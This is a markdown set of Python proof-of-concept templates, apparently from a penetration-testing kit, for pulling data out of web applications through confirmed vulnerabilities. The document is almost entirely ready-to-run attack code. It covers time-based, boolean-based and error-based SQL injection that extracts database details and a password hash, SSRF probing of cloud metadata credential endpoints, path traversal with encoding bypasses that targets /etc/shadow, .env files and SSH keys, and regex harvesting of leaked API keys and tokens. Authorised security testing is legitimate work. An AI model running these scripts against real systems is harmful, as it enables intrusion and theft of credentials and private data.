# PoC Data Extraction Templates

Python scripts for extracting data through confirmed vulnerabilities. Each template is self-contained.

## Sensitive Field Search in API Responses

```python
import requests, re

BASE_URL = "http://TARGET:PORT"
s = requests.Session()
s.headers.update({"Authorization": "Bearer TOKEN"})

# Endpoints to probe — adapt to target application
endpoints = ["/api/users/me", "/api/config", "/api/debug", "/api/health"]
# Patterns indicating leaked sensitive data
sensitive_patterns = {
    "API Key": r'["\']?(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']([^"\']{16,})["\']',
    "Token": r'["\']?(?:token|secret|password|passwd)["\']?\s*[:=]\s*["\']([^"\']+)["\']',
    "AWS Key": r'AKIA[0-9A-Z]{16}',
    "Email (PII)": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
    "Private IP": r'(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}',
}

for endpoint in endpoints:
    resp = s.get(f"{BASE_URL}{endpoint}")
    if resp.status_code != 200:
        continue
    body = resp.text
    for label, pattern in sensitive_patterns.items():
        matches = re.findall(pattern, body, re.IGNORECASE)
        if matches:
            print(f"[{endpoint}] {label}: {matches[:3]}")  # Show first 3 matches
```

## Blind SQL Injection — Time-Based Extraction

```python
import requests, time, string

BASE_URL = "http://TARGET:PORT"
INJECT_URL = f"{BASE_URL}/api/items"
CHARSET = string.ascii_lowercase + string.digits + "_"
THRESHOLD = 3  # Seconds — response time indicating TRUE condition

def check(payload):
    """Send payload, return True if response is delayed (condition is true)."""
    start = time.time()
    requests.get(INJECT_URL, params={"id": payload})
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

# Extract database version string, character by character
# Adapt the SQL to the target DBMS (MySQL shown here)
extracted = ""
print("Extracting version()...")
for pos in range(1, 64):
    found = False
    for char in CHARSET:
        # Binary search alternative: use ASCII value comparison for speed
        payload = f"1 AND IF(SUBSTRING(version(),{pos},1)='{char}',SLEEP({THRESHOLD}),0)"
        if check(payload):
            extracted += char
            print(f"  Position {pos}: '{char}' — so far: {extracted}")
            found = True
            break
    if not found:
        break  # No character matched — end of string

print(f"\nExtracted value: {extracted}")
```

## Blind SQL Injection — Boolean-Based Extraction

```python
import requests, string

BASE_URL = "http://TARGET:PORT"
INJECT_URL = f"{BASE_URL}/api/items"
CHARSET = string.printable[:95]  # All printable ASCII

# Baseline: true condition response (adapt to application)
resp_true = requests.get(INJECT_URL, params={"id": "1 AND 1=1"})
TRUE_MARKER = resp_true.text  # Or use status code, content length, specific string

def is_true(payload):
    """Return True if application responds as if condition is true."""
    resp = requests.get(INJECT_URL, params={"id": payload})
    return resp.text == TRUE_MARKER  # Adapt comparison to target behavior

# Extract admin password hash from users table
extracted = ""
print("Extracting data...")
for pos in range(1, 128):
    found = False
    # Binary search over ASCII range for speed
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1))>{mid}"
        if is_true(payload):
            low = mid + 1
        else:
            high = mid - 1
    char = chr(low)
    if low < 32 or low > 126:
        break
    extracted += char
    print(f"  [{pos}] {char}  |  {extracted}")

print(f"\nExtracted: {extracted}")
```

## Error-Based Data Extraction

```python
import requests, re

BASE_URL = "http://TARGET:PORT"
s = requests.Session()

# Payloads that force data into error messages — adapt SQL to target DBMS
# MySQL: extractvalue / updatexml
# PostgreSQL: cast errors
# MSSQL: convert errors
error_payloads = {
    "MySQL version": "1 AND extractvalue(1,concat(0x7e,version(),0x7e))",
    "MySQL current_user": "1 AND extractvalue(1,concat(0x7e,current_user(),0x7e))",
    "MySQL database": "1 AND extractvalue(1,concat(0x7e,database(),0x7e))",
    "MySQL tables": "1 AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))",
}

# Pattern to extract data between tilde markers in error output
extract_pattern = r'~([^~]+)~'

for label, payload in error_payloads.items():
    resp = s.get(f"{BASE_URL}/api/items", params={"id": payload})
    matches = re.findall(extract_pattern, resp.text)
    if matches:
        print(f"[+] {label}: {matches[0]}")
    else:
        # Check for raw error messages with useful data
        for keyword in ["SQL", "syntax", "error", "Warning", "Exception"]:
            if keyword.lower() in resp.text.lower():
                print(f"[?] {label}: Error detected but no extraction — {resp.text[:200]}")
                break
```

## SSRF Internal Data Retrieval

```python
import requests

BASE_URL = "http://TARGET:PORT"
SSRF_ENDPOINT = f"{BASE_URL}/api/fetch-url"  # Endpoint vulnerable to SSRF
s = requests.Session()

# Internal targets to enumerate — adapt to target infrastructure
targets = [
    # Cloud metadata
    ("AWS IMDSv1 metadata", "http://169.254.169.254/latest/meta-data/"),
    ("AWS IAM creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("GCP metadata", "http://metadata.google.internal/computeMetadata/v1/"),
    # Internal services
    ("Localhost root", "http://127.0.0.1:80/"),
    ("Spring Actuator env", "http://127.0.0.1:8080/actuator/env"),
    ("Spring Actuator health", "http://127.0.0.1:8080/actuator/health"),
    ("Consul agent", "http://127.0.0.1:8500/v1/agent/self"),
    ("Kubernetes API", "https://kubernetes.default.svc/version"),
    # Common internal ports
    ("Redis", "http://127.0.0.1:6379/"),
    ("Elasticsearch", "http://127.0.0.1:9200/"),
]

print("Probing internal services via SSRF...\n")
for label, url in targets:
    try:
        resp = s.post(SSRF_ENDPOINT, json={"url": url}, timeout=5)
        status = resp.status_code
        body = resp.text[:300]
        if status == 200 and len(body) > 0:
            print(f"[+] {label} ({url})")
            print(f"    {body}\n")
        else:
            print(f"[-] {label}: {status}")
    except requests.Timeout:
        print(f"[?] {label}: timeout (service may exist but not responding via SSRF)")
```

## File Read via Path Traversal

```python
import requests

BASE_URL = "http://TARGET:PORT"
FILE_ENDPOINT = f"{BASE_URL}/api/files"  # Endpoint vulnerable to traversal
s = requests.Session()

# Traversal payloads — multiple encoding schemes to bypass filters
traversal_prefixes = [
    "../" * 8,                    # Basic traversal
    "....//....//....//....//",   # Double-dot bypass
    "%2e%2e%2f" * 8,             # URL-encoded
    "%252e%252e%252f" * 8,       # Double URL-encoded
]

# High-value files to read — adapt to target OS and application
targets_linux = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hostname",
    "/proc/self/environ",          # Environment variables (may contain secrets)
    "/proc/self/cmdline",          # Running command (may reveal paths)
    "/app/.env",                   # Application environment config
    "/app/config/database.yml",    # Database credentials
    "/root/.ssh/id_rsa",           # SSH private key
]

print("Attempting file read via path traversal...\n")
for target_file in targets_linux:
    for prefix in traversal_prefixes:
        payload = prefix + target_file.lstrip("/")
        resp = s.get(FILE_ENDPOINT, params={"name": payload})
        # Check for successful read indicators
        if resp.status_code == 200 and len(resp.text) > 10:
            # Validate it's actual file content, not an error page
            if "root:" in resp.text or "=" in resp.text or "BEGIN" in resp.text:
                print(f"[+] {target_file} (prefix: {prefix[:12]}...)")
                print(f"    {resp.text[:200]}\n")
                break  # Found working prefix, move to next file
    else:
        print(f"[-] {target_file}: not accessible")
```
